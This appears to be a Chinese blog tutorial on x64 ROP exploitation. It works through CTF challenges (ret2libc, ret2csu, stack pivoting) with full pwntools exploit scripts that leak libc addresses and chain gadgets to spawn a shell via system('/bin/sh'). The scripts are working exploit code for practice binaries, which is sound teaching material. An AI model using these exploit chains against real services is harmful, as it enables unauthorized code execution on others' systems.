{"title":"ROP-x64","uid":"2d83114abbe0d2e1d7c9af7e01c50ee1","slug":"ROP-x64","date":"2021-10-05T11:59:10.000Z","updated":"2021-11-06T03:50:40.735Z","comments":true,"path":"api/articles/ROP-x64.json","keywords":null,"cover":"https://i.loli.net/2021/10/29/phEINMSHn8PWb2w.jpg","content":"<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>之前在前面写了一篇介绍ROP的，不过是32位的，因为64位和32位多多少少有不同点，所以这次就介绍64位下的ROP</p></blockquote>\n<h1 id=\"pwn07\"><a href=\"#pwn07\" class=\"headerlink\" title=\"pwn07\"></a><a href=\"https://ctf.show/files/c4d406012dcbf2b25fd23b6a48bf2b12/pwn?token=eyJ1c2VyX2lkIjo0MjMyLCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjo5NX0.YWwLmA.og84JNMuW7w7Z0oZIr90NIxImf4\">pwn07</a></h1><p>做法和之前32位的ret2libc3思路是一致的，泄露puts函数地址找到libc计算出system函数地址从而获取shell。**64位是通过寄存器传递参数(当参数小于7个时，参数从左到右放入寄存器rdi,rsi,rdx,rcx,r8,r9)**，所以执行system(“bin/sh”)时rdi寄存器要存储的是bin/sh字符串，例如：</p>\n<p>泄露puts函数地址需要先将puts的got表地址传递到rdi寄存器中在跳转到puts函数输出</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br></pre></td></tr></table></figure>\n\n<p>在执行system函数时不仅要记住通过rdi传参还要注意堆栈对齐：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure>\n\n<p>p64(ret_addr)目的用于堆栈对齐，不然后面会报错。</p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./pwn1&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28138</span>)</span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x04006e3</span>  <span class=\"comment\"># ROPgadget --binary pwn1 --only &#x27;pop|ret&#x27;|grep &#x27;rdi&#x27;</span></span><br><span class=\"line\">ret_addr = <span class=\"number\">0x4004c6</span> <span class=\"comment\"># ROPgadget --binary pwn1 --only &#x27;ret&#x27;</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn1&#x27;</span>)</span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">start_addr = elf.symbols[<span class=\"string\">&#x27;_start&#x27;</span>]</span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)  <span class=\"comment\"># 泄露puts函数的地址</span></span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;\\x0a&#x27;</span>)</span><br><span class=\"line\">libc_puts_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))  <span class=\"comment\"># 接收地址</span></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>, libc_puts_addr)  <span class=\"comment\"># 匹配libc库</span></span><br><span class=\"line\">libcbase = libc_puts_addr - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)  <span class=\"comment\"># 计算基地址</span></span><br><span class=\"line\">sys_addr = libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)  <span class=\"comment\"># 计算system函数地址</span></span><br><span class=\"line\">bin_sh = libcbase+libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)  <span class=\"comment\"># 计算bin/sh字符串地址</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span>+p64(<span class=\"number\">0x4004c6</span>)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)  <span class=\"comment\"># 构造rop链</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"ret2csu\"><a href=\"#ret2csu\" class=\"headerlink\" title=\"ret2csu\"></a>ret2csu</h1><p>由于程序没有调用puts函数，我们不能通过puts函数泄露函数地址得到libc。所以，这次我们利用一个万能gadgets来泄露函数地址获得libc，这个gadgets在__ libc_csu_init函数里面，而这个  __libc_csu_init函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。<img src=\"https://i.loli.net/2021/10/17/tcU5L9SvaAFTsMB.png\" alt=\"屏幕截图 2021-10-17 200528.png\"></p>\n<p>通过objdump -M intel -d level5命令来查看反汇编，将其中一部分指令划分为gadgets1和gadgets2，其中gadgets1作用是将栈里面的值传给寄存器，而gadgets2作用是将一些寄存器的赋给另一些寄存器。</p>\n<p>接下来就是利用这个gadgets来获取shell</p>\n<ul>\n<li>利用栈溢出执行 libc_csu_gadgets 组装好 write 函数并泄露write函数地址，并使得程序重新执行 main 函数</li>\n<li>根据 libcsearcher 获取对应 libc 版本以及system函数地址</li>\n<li>再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入system 地址以及 ‘/bin/sh’ 地址，并使得程序重新执行 main 函数。</li>\n<li>再次利用栈溢出执行 libc_csu_gadgets 执行system(‘/bin/sh’) 获取 shell。</li>\n</ul>\n<p><img src=\"https://i.loli.net/2021/10/17/W9hdYOlz2JkwnSK.png\" alt=\"image.png\"></p>\n<p>下图展示了如何利用万能gadgets的流程：</p>\n<p><img src=\"https://i.loli.net/2021/10/18/IiotnxPjeKg72OS.png\" alt=\"image.png\"></p>\n<h2 id=\"第一次发送payload：\"><a href=\"#第一次发送payload：\" class=\"headerlink\" title=\"第一次发送payload：\"></a>第一次发送payload：</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x80</span>+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>+p64(<span class=\"number\">0x400606</span>)+p64(<span class=\"number\">0</span>) +p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">1</span>) + p64(got_write) + p64(<span class=\"number\">1</span>) + p64(got_write) + p64(<span class=\"number\">8</span>) + p64(<span class=\"number\">0x4005F0</span>) + <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">56</span> + p64(main_addr)</span><br></pre></td></tr></table></figure>\n\n<p>p64(0x400606)：是gadgets1的地址</p>\n<p>p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write)+ p64(8) ：对应的寄存器为rbx,rbp,r12,r13,r14,r15</p>\n<p><strong>rbx存入0是因为gadgets2中rbx会加1再与rbp比较，如果不同就会跳转，不能继续按我们的要求执行，所以必须保证rbx加1以后要和rbp的值一样，所以后面的rbp填入1；p64(gadgets1)将会填入r12，因为gadgets2会跳转到r12+rbx * 8的位置，因为rbx为0所以就是跳转到r12的位置； p64(1) + p64(got_write) + p64(8)将会填入r13,r14,r15寄存器，再gadgets2中会转移到edi,rsi,rdx中，也就是用于传参的前三个寄存器；p64(got_write) + p64(1) + p64(got_write)+ p64(8)最后组装成write(1,address,8)泄露write函数地址</strong></p>\n<p>p64(0x4005F0)：是gadgets2的地址</p>\n<p>“a”*56+p64(main_addr) ：因为gadgets2后面是gadgets1，gadgets1会弹出栈里面的值，为了不让gadgets1影响后面操作，就填入无用字符串，最后跳转会main函数</p>\n<p><img src=\"https://i.loli.net/2021/10/18/4fbryJxcqLZoTlH.png\" alt=\"image.png\"></p>\n<h2 id=\"第二次发送payload：\"><a href=\"#第二次发送payload：\" class=\"headerlink\" title=\"第二次发送payload：\"></a>第二次发送payload：</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload2 =  <span class=\"string\">&quot;\\x00&quot;</span>*<span class=\"number\">136</span>+p64(<span class=\"number\">0x400606</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">1</span>) + p64(got_read) + p64(<span class=\"number\">0</span>) + p64(bss_addr) + p64(<span class=\"number\">16</span>)+p64(<span class=\"number\">0x4005F0</span>)+<span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">56</span>+p64(main)</span><br></pre></td></tr></table></figure>\n\n<p> p64(got_read) + p64(0) + p64(bss_addr) + p64(16)：组装成read(0,bss_addr,16)，作用是向bss段写入16字节的东西</p>\n<p><img src=\"https://i.loli.net/2021/10/18/SfaDY9HqAkTUGrd.png\" alt=\"image.png\"></p>\n<h2 id=\"第三次发送payload\"><a href=\"#第三次发送payload\" class=\"headerlink\" title=\"第三次发送payload\"></a>第三次发送payload</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload3 =  <span class=\"string\">&quot;\\x00&quot;</span>*<span class=\"number\">136</span> + p64(<span class=\"number\">0x400606</span>) + p64(<span class=\"number\">0</span>) +p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">1</span>) + p64(bss_addr) + p64(bss_addr+<span class=\"number\">8</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x4005F0</span>) + <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">56</span> + p64(main_addr)</span><br></pre></td></tr></table></figure>\n\n<p>p64(bss_addr) + p64(bss_addr+8)+ p64(0) + p64(0)：组装成system(“bin/sh”)，因为只有一个参数所以后面两个填零不会造成什么影响</p>\n<p><img src=\"https://i.loli.net/2021/10/18/WrZCcJ9djxq6feP.png\" alt=\"image.png\"></p>\n<h2 id=\"EXP-1\"><a href=\"#EXP-1\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;level5&#x27;</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./level5&#x27;</span>)</span><br><span class=\"line\">got_write = elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">got_read = elf.got[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">start = elf.symbols[<span class=\"string\">&#x27;_start&#x27;</span>]  </span><br><span class=\"line\">payload1 =  <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">136</span></span><br><span class=\"line\">payload1 += p64(<span class=\"number\">0x400606</span>) + p64(<span class=\"number\">0</span>) +p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">1</span>) + p64(got_write) + p64(<span class=\"number\">1</span>) + p64(got_write) + p64(<span class=\"number\">8</span>)   <span class=\"comment\"># 跳转到gadgets1并构造write函数泄露write函数</span></span><br><span class=\"line\">payload1 += p64(<span class=\"number\">0x4005F0</span>)   <span class=\"comment\"># 跳转到gadgets2将对应参数放入对应寄存器</span></span><br><span class=\"line\">payload1 += <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">56</span></span><br><span class=\"line\">payload1 += p64(start)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Hello, World\\n&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;\\n#############sending payload1#############\\n&quot;</span></span><br><span class=\"line\">p.send(payload1)</span><br><span class=\"line\">write_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))  <span class=\"comment\"># 接收地址</span></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;write&#x27;</span>, write_addr)</span><br><span class=\"line\">libcbase = write_addr-libc.dump(<span class=\"string\">&#x27;write&#x27;</span>)</span><br><span class=\"line\">system_addr = libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&#x27;system_address:&#x27;</span>,system_addr</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&#x27;libcbase:&#x27;</span>,libcbase</span><br><span class=\"line\">bss_addr=<span class=\"number\">0x601028</span>  <span class=\"comment\"># 用于写入system函数以及bin/sh字符串</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Hello, World\\n&quot;</span>)</span><br><span class=\"line\">payload2 =  <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">136</span></span><br><span class=\"line\">payload2 += p64(<span class=\"number\">0x400606</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">1</span>) + p64(got_read) + p64(<span class=\"number\">0</span>) + p64(bss_addr) + p64(<span class=\"number\">16</span>)   <span class=\"comment\"># 构造read函数向bss段写入数据</span></span><br><span class=\"line\">payload2 += p64(<span class=\"number\">0x4005F0</span>) </span><br><span class=\"line\">payload2 += <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">56</span></span><br><span class=\"line\">payload2 += p64(start)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;\\n#############sending payload2#############\\n&quot;</span></span><br><span class=\"line\">p.send(payload2)</span><br><span class=\"line\">p.send(p64(system_addr))</span><br><span class=\"line\">p.send(<span class=\"string\">&quot;/bin/sh\\0&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Hello, World\\n&quot;</span>)</span><br><span class=\"line\">payload3 =  <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">136</span></span><br><span class=\"line\">payload3 += p64(<span class=\"number\">0x400606</span>) + p64(<span class=\"number\">0</span>) +p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">1</span>) + p64(bss_addr) + p64(bss_addr+<span class=\"number\">8</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>)   <span class=\"comment\"># 跳转执行bss段中的内容</span></span><br><span class=\"line\">payload3 += p64(<span class=\"number\">0x4005F0</span>) </span><br><span class=\"line\">payload3 += <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">56</span></span><br><span class=\"line\">payload3 += p64(start)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;\\n#############sending payload3#############\\n&quot;</span></span><br><span class=\"line\">p.send(payload3)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://i.loli.net/2021/10/18/osBbMZqYGX8e41x.png\" alt=\"image.png\"></p>\n<h1 id=\"frame-faking\"><a href=\"#frame-faking\" class=\"headerlink\" title=\"frame faking\"></a>frame faking</h1><p>题目存在溢出，但是只溢出16个字节，而64位要构造rop链通常需要4*8=32字节，所以无法直接泄露。但是这个题目是无限输入的，所以我们可以尝试采取栈迁移的方式。栈迁移适用于以下情况：</p>\n<ul>\n<li>可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链</li>\n<li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。</li>\n<li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li>\n</ul>\n<p>所以基本思路就是，先在栈上面构建好ROP链，之后让程序跳转执行我们构建好的ROP链。但是我们需要知道跳转地址，也就是我们构造好ROP链的位置。<img src=\"https://i.loli.net/2021/11/06/oGFmLB3sAyp6eJW.png\" alt=\"image.png\"></p>\n<p>程序会一直执行这个函数，函数会使用read函数将输入内容写入buf变量，再用puts函数输出。<strong>read函数不同于gets函数，read读取完以后不会像gets函数一样在数据后面补充\\0</strong>，所以只要我们将缓冲区填满，就可以泄露rbp指向的地址了，再通过计算偏移就可以确定栈的位置了。</p>\n<p><img src=\"https://i.loli.net/2021/11/06/xqCWVgiK46U1kRa.png\" alt=\"屏幕截图 2021-11-06 110037.png\"></p>\n<p>接下来就是计算偏移0x7fffffffde40-0x7fffffffddd0=0x70</p>\n<p><img src=\"https://i.loli.net/2021/11/06/niKAlfQtydDSrCY.png\" alt=\"屏幕截图 2021-11-06 110610.png\"></p>\n<p>所以payload2就构建好了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">stack = u64(io.recvuntil(<span class=\"string\">&quot;\\x7f&quot;</span>)[-<span class=\"number\">6</span>: ].ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>)) - <span class=\"number\">0x70</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>+p64(pop_rdi_ret)+p64(elf.got[<span class=\"string\">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>])+p64(<span class=\"number\">0x400676</span>)</span><br><span class=\"line\">payload += (<span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">80</span>-<span class=\"built_in\">len</span>(payload))+p64(stack)+p64(<span class=\"number\">0x4006be</span>)) <span class=\"comment\">#leave_ret</span></span><br></pre></td></tr></table></figure>\n\n<p>接下来就是匹配libc库以及计算system以及bin/sh的地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">puts_addr = u64(io.recvuntil(<span class=\"string\">&quot;\\x7f&quot;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;puts&quot;</span>,puts_addr)</span><br><span class=\"line\">libcbase = puts_addr - libc.dump(<span class=\"string\">&quot;puts&quot;</span>)</span><br><span class=\"line\">success(<span class=\"string\">&quot;libc.address -&gt; &#123;:#x&#125;&quot;</span>.<span class=\"built_in\">format</span>(libcbase))</span><br><span class=\"line\">system_addr=libcbase+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br><span class=\"line\">binsh_addr=libcbase+libc.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>由于利用过程中栈的结构会发生变化, 所以一些关键的偏移还需要通过调试来确定</p>\n<p><img src=\"https://i.loli.net/2021/11/06/n8sfBd9X6vQJFWu.png\" alt=\"image.png\"></p>\n<p>第三次输入时，rbp指向地址对应栈帧偏移不再是stack了，而是stack-0x30了。修改后得到payload3</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload=flat([<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>, ret_addr,pop_rdi_ret,binsh_addr,system_addr])</span><br><span class=\"line\">payload += (<span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">80</span>-<span class=\"built_in\">len</span>(payload))+p64(stack)+p64(<span class=\"number\">0x4006be</span>))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"EXP-2\"><a href=\"#EXP-2\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">context.binary = <span class=\"string\">&quot;./over.over&quot;</span></span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x400793</span></span><br><span class=\"line\">ret_addr = <span class=\"number\">0x0400509</span></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./over.over&quot;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./over.over&quot;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;&gt;&quot;</span>, <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">80</span>)</span><br><span class=\"line\">stack = u64(io.recvuntil(<span class=\"string\">&quot;\\x7f&quot;</span>)[-<span class=\"number\">6</span>: ].ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>)) - <span class=\"number\">0x70</span></span><br><span class=\"line\">success(<span class=\"string\">&quot;stack -&gt; &#123;:#x&#125;&quot;</span>.<span class=\"built_in\">format</span>(stack))</span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>+p64(pop_rdi_ret)+p64(elf.got[<span class=\"string\">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>])+p64(<span class=\"number\">0x400676</span>)</span><br><span class=\"line\">payload += (<span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">80</span>-<span class=\"built_in\">len</span>(payload))+p64(stack)+p64(<span class=\"number\">0x4006be</span>)) <span class=\"comment\">#leave_ret</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;&gt;&quot;</span>, payload)</span><br><span class=\"line\">puts_addr = u64(io.recvuntil(<span class=\"string\">&quot;\\x7f&quot;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\0&#x27;</span>))</span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;puts&quot;</span>,puts_addr)</span><br><span class=\"line\">libcbase = puts_addr - libc.dump(<span class=\"string\">&quot;puts&quot;</span>)</span><br><span class=\"line\">success(<span class=\"string\">&quot;libc.address -&gt; &#123;:#x&#125;&quot;</span>.<span class=\"built_in\">format</span>(libcbase))</span><br><span class=\"line\">system_addr=libcbase+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br><span class=\"line\">binsh_addr=libcbase+libc.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)</span><br><span class=\"line\">payload=flat([<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>, ret_addr,pop_rdi_ret,binsh_addr,system_addr])</span><br><span class=\"line\">payload += (<span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">80</span>-<span class=\"built_in\">len</span>(payload))+p64(stack-<span class=\"number\">0x30</span>)+p64(<span class=\"number\">0x4006be</span>))</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">&quot;&gt;&quot;</span>, payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n","text":" 之前在前面写了一篇介绍ROP的，不过是32位的，因为64位和32位多多少少有不同点，所以这次就介绍64位下的ROP pwn07做法和之前32位的ret2libc3思路是一致的，泄露puts函数地址找到libc计算出system函数地址从而获取shell。**64位是通过寄存器传...","link":"","photos":[],"count_time":{"symbolsCount":"8.2k","symbolsTime":"7 mins."},"categories":[{"name":"学习记录","slug":"学习记录","count":3,"path":"api/categories/学习记录.json"}],"tags":[{"name":"pwn","slug":"pwn","count":7,"path":"api/tags/pwn.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pwn07\"><span class=\"toc-text\">pwn07</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" 